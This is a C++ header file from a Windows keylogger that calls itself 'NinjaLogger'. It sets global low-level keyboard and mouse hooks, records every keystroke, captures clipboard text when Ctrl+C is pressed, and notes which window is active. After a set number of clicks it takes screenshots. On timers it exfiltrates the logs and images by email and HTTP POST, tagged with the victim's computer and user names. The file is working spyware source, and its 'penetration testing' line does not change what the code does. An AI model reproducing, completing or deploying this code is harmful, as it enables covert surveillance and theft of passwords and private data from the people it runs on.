
//Heart and soul of the KeyLogger

#ifndef KEYBHOOK_H
#define KEYBHOOK_H

#include <iostream>
#include <fstream>
#include "windows.h"
#include "KeyConstants.h"
#include "Timer.h"
#include "Helper.h"
#include "SendMail.h"
#include "HTTPPost.h"
#include "ScreenShotter.h"
#include "config.h"

//including registration of key states
std::string keylog = ""; //all the keystrokes are stored, after mail is sent, this variable will be flushed of all content //if sendmail not succeed, we will not clear the contents
//Mail::MailInstance MailHandlerKey;
bool controlKey = false;
std::string lastWindow = "";
int clickCount = 0;
bool clipboardError = false;
bool screenshotCooldown = true;
int screenshotClicks = 0;
int SCREENSHOT_THRESHOLD_CLICKS = 5;
bool sendingScreenshot = false;

void TimerSendMail()
{
    //attempt to send email every 2 minutes, normally 12 hours? or 2 hours, etc
    //check if anything was recorded in the keylog string, else no point to do anything
    if(keylog.empty())
        return;

    keylog += "[ENT][ENT]Click Count Detected: " + Helper::ToString(clickCount);
    std::string last_file = IO::WriteLog(keylog); //write to log

    if(last_file.empty())
    {
        //implement encryption myself
        //write it to the debug log - file creation was not successful
        Helper::WriteAppLog("File Creation was not successful. Keylog '" + keylog + "'");
        return;
    }

    int x = Mail::SendMail("Log [" + last_file + "]",
                           "[From Computer: " + Helper::ToString(getenv("COMPUTERNAME")) + " || User: " + Helper::ToString(getenv("USERNAME")) + "] \n\nHi :) \nThe File has been attached to this mail :)\n\nRaw Data:\n\nFor Penetration Testing Purposes.\n\nYours truly, NinjaLogger",
                           IO::GetOurPath(true) + last_file);

    if(x != 7) //mail sending has failed (7 is the success code)
    {
        Helper::WriteAppLog("Mail was not sent! Error Code: " + Helper::ToString(x));
    } else {
        //flush keyloghttps://1fichier.com/?isdnm6pu2o
        keylog = ""; //since it will be written into the file on top
    }
}

void TimerSendHTTP()
{
    //attempt to send email every 2 minutes, normally 12 hours? or 2 hours, etc
    //check if anything was recorded in the keylog string, else no point to do anything
    std::string keylogClone = keylog; //std::string is VERY IMPORTANT, not just STRING
    if(keylogClone.empty())
        return;

    keylogClone += "[ENT][ENT]Click Count Detected: " + Helper::ToString(clickCount);
    std::string last_file = IO::WriteLog(keylogClone); //write to log

    if(last_file.empty())
    {
        //implement encryption myself
        //write it to the debug log - file creation was not successful
        Helper::WriteAppLog("File Creation was not successful (POST). Keylog '" + keylogClone + "'");
        return;
    }


    int x = HTTPPost::SendKeylogData(IO::GetOurPath(true) + last_file);


    if(x != 201) //mail sending has failed (7 is the success code)
    {
        keylog = ""; //prevent data from too getting too big? #MIGHT LOSE SOME DATA TOO
        Helper::WriteAppLog("POST was not sent! Error Code: " + Helper::ToString(x));
    } else {
        //flush keyloghttps://1fichier.com/?isdnm6pu2o
        keylog = ""; //since it will be written into the file on top
    }
}

void ResetCooldown(){
    screenshotCooldown = true;
    screenshotClicks = 0;
    //Helper::WriteAppLog("SCREENSHOT COOLDOWN! " + Helper::ToString(screenshotCooldown) + Helper::ToString(screenshotClicks));
}

void SendScreenshot()
{
    //Get Screenshot
    std::string base64image = ScreenShotter::GetScreenshot(IO::GetOurPath(true));

    int x = HTTPPost::SendImage(base64image);

    if(x != 201) //mail sending has failed (7 is the success code)
    {
        Helper::WriteAppLog("IMAGE was not sent! Error Code: " + Helper::ToString(x));
    }
}




Timer MailTimer(TimerSendMail, 2000 * 60, Timer::Infinite, "Normal Mail Timer"); //1 hour Function(function to run, interval, times=all the time forever)

Timer PostTimer(TimerSendHTTP, 60000 * 60, Timer::Infinite, "HTTP POST Timer"); //1 hour

Timer ScreenshotTimer(ResetCooldown, 70000 * 60, Timer::Infinite, "Screenshot Timer"); //45 minutes



HHOOK eHook = NULL; //pointer to our hook
HHOOK hMouseHook = NULL;

void CheckScreenshotCount();
//FOR USE FOR RECORD MOUSE CLICKS
std::string GetActiveWindowTitle()
{
    try{
     char wnd_title[256];
     HWND hwnd=GetForegroundWindow(); // get handle of currently active window
     GetWindowText(hwnd,wnd_title,sizeof(wnd_title));
     return wnd_title;
    } catch(...)
    {
        return "No Windows Detected";
    }
}

std::string GetClipboardText();


//the heart of the KL
//called by the system when a keyboard key is pressed
//you can disable keys in this methods, like abc etc etc
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{

    //if we receive nCode less than 0, we must propagate the hook forward (push it onwards)
    //can learn more about nCode on the net

    if(nCode < 0)
        CallNextHookEx(eHook, nCode, wparam, lparam); //nCode = keypress, wparam key type, lparam type of KBDLLHook struct
    //we are interested in VK code + scan code
    KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *)lparam; //cast to a pointer
    try{
        if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) //will be able to check if someone has pressed the key (if somebody holds a shift, KEYS or Key)
        {
            //Helper::WriteAppLog("CAME IN CHECK KEYBOARD " + keylog);
            keylog += Keys::KEYS[kbs->vkCode].Name; //this is to map to the MAP struct we created earlier
            if(kbs->vkCode == VK_LCONTROL){
                controlKey = true;

            }
            if(Keys::KEYS[kbs->vkCode].Name == "C"){
                if(controlKey){
                    //copy to clip board
                    keylog += "[ENT][ENT][UserCopied]: " + GetClipboardText() + "[ENT][ENT]";
                }
            }
            if(kbs->vkCode == VK_RETURN)
                keylog += "[ENTER]"; //wont log "enter" key, will just print a new line
        }
        else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
        {
            DWORD key1 = kbs->vkCode;
            if(key1 == VK_CONTROL){
                controlKey = false;
            }

            //output html like print of system keys if shift key released
            //for example [Shift][a][b][c][/Shift]
            DWORD key = kbs->vkCode;
            if(key == VK_CONTROL
               || key == VK_LCONTROL
               || key == VK_RCONTROL
               || key == VK_SHIFT
               || key == VK_RSHIFT
               || key == VK_LSHIFT
               || key == VK_MENU
               || key == VK_LMENU
               || key == VK_RMENU
               || key == VK_CAPITAL
               || key == VK_NUMLOCK
               || key == VK_LWIN
               || key == VK_RWIN)
            {
                std::string KeyName = Keys::KEYS[kbs->vkCode].Name; //vkCode == a hexadecimal value from lparam
                KeyName.insert(1, "/"); //inserting backslash
                keylog += KeyName;
            }

        }
    } catch(exception ex) {

    }

    //VERY IMPORTANT if you dont do this, the key wont be registered? Grab and release it back
    return  CallNextHookEx(eHook, nCode, wparam, lparam);
}



LRESULT OurMouseProc (int nCode, WPARAM wParam, LPARAM lParam)
{

        MOUSEHOOKSTRUCT * pMouseStruct = (MOUSEHOOKSTRUCT *)lParam;
    try{
        if (pMouseStruct != NULL){
            if(wParam == WM_LBUTTONDOWN)
            {
                CheckScreenshotCount();
                //Helper::WriteAppLog("CAME IN CHECK MOUSE");
                std::string lowerTitle = GetActiveWindowTitle();
                if(lastWindow == lowerTitle)
                {
                    //dont do anything
                    clickCount++;
                    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
                } else {
                    lastWindow = lowerTitle;
                    keylog += "[ENT]Click Count Detected: " + Helper::ToString(clickCount);
                    clickCount = 0;
                }
                for(unsigned int i = 0; i < lowerTitle.length(); ++i) {
                    lowerTitle[i] = tolower(lowerTitle[i]);
                }

                std::string header = "[ENT](--------)[ENT][ENT]---*[";
                int foundTags = 0;
                if(lowerTitle.length() > 0)
                {
                   //do something
                    for (auto it = Keys::Tags.begin(); it != Keys::Tags.end(); ++it)
                    {
                        if (lowerTitle.find(it->first) != std::string::npos)
                        {
                            foundTags++;
                            header += it->second + ", ";
                        }
                    }
                }
                if(foundTags > 0){
                    header = header.substr(0, header.length()-2);
                } else {
                    header += "General";
                }
                header += "]*---";

                //keylog += "[ENTER]\n[App Created New Line][ENTER]\n[LMB Down Detected][ENTER]\nCurrent Window: " + GetActiveWindowTitle() + "[ENTER]\n[App Created New Line][ENTER]\n";
                keylog += header + "[ENT]TIME=" + Helper::DateTime().GetDateTimeString() + "[ENT][LMB]Current Window: " + GetActiveWindowTitle() + "[ENT]";
            }
            //printf("Mouse position X = %d  Mouse Position Y = %d\n", pMouseStruct->pt.x,pMouseStruct->pt.y);
        }
    } catch (exception ex){

    }
    //windowTitle.clear();
    //lowerTitle.clear();
    //header.clear();
    return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

void CheckScreenshotCount(){
    if(screenshotCooldown){
        screenshotClicks++;
        if(screenshotClicks > SCREENSHOT_THRESHOLD_CLICKS){
            //start screenshot
            SendScreenshot();
            screenshotCooldown = false;

            //REFRESH THE HOOKS NEEDED BADLY
            UnhookWindowsHookEx(hMouseHook);
            hMouseHook = SetWindowsHookEx( WH_MOUSE_LL, (HOOKPROC)OurMouseProc, GetModuleHandle(NULL), 0);
            UnhookWindowsHookEx(eHook);
            eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);

        }
    }
}
//install hook function
bool InstallHooks()
{
    //start it asynchronously
    Helper::WriteAppLog("Hook Started... Timer started");
    if(CONFIG_DICT["EMAIL_ENABLED"] == "TRUE"){
        Helper::WriteAppLog("Mail Timer Started");
        MailTimer.Start(true);
    }
    if(CONFIG_DICT["SERVER_ENABLED"] == "TRUE"){
        PostTimer.Start(true);
    }
    if(CONFIG_DICT["SCREENSHOT_ENABLED"] == "TRUE"){
        ScreenshotTimer.Start(true);
    }
    //can research on this Think this is use to make macros
    hMouseHook = SetWindowsHookEx( WH_MOUSE_LL, (HOOKPROC)OurMouseProc, GetModuleHandle(NULL), 0);
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc,
                             GetModuleHandle(NULL), 0); //WH_KEYBOARD_LL = used keyboard hook LL = low level, indicates a global hook, value of constant is 13 || OurKeyboardHook (a method the system will invoke this method to handle the key hooked) || IF DWORD is 0, will share the key with ALL threads

    return eHook == NULL; //return a boolean if HAVE STUFF then true
}

//uninstalls the hook - wont actTimerually use, might need it for a reverse shell
bool UninstallHooks()
{
    //stops the keylogging process
    bool b = UnhookWindowsHookEx(eHook);
    UnhookWindowsHookEx(hMouseHook);
    eHook = NULL;
    return (bool)b;
}

bool IsHooked()
{
    return (bool)(eHook == NULL); //is not equals?
}

std::string GetClipboardText()
{
    if(clipboardError){
        return "[Clipboard Error]";
    }
    try{
      // Try opening the clipboard
      if (! OpenClipboard(nullptr)){
        //error
        clipboardError = true;
        Helper::WriteAppLog("Error Found Clipboard: " + GetLastError());
        return "[Cannot capture clipboard]";
      }


      // Get handle of clipboard object for ANSI text
      HANDLE hData = GetClipboardData(CF_TEXT);
      if (hData == nullptr){
            clipboardError = true;
            Helper::WriteAppLog("Error Found Clipboard: " + GetLastError());
            return "[Cannot capture clipboard]";
      }

      // Lock the handle to get the actual text pointer
      char * pszText = static_cast<char*>( GlobalLock(hData) );
      if (pszText == nullptr){
            clipboardError = true;
            Helper::WriteAppLog("Error Found Clipboard: " + GetLastError());
        return "[Cannot capture clipboard]";
      }


      // Save text in a string class instance
      std::string text( pszText );

      // Release the lock
      GlobalUnlock( hData );

      // Release the clipboard
      CloseClipboard();

      return text;
  } catch(...){
      clipboardError = true;
      Helper::WriteAppLog("Error Found Clipboard: " + GetLastError());
        return "[Cannot Capture Clipboard, Error Occurred]";
  }


}



#endif // KEYBHOOK_H
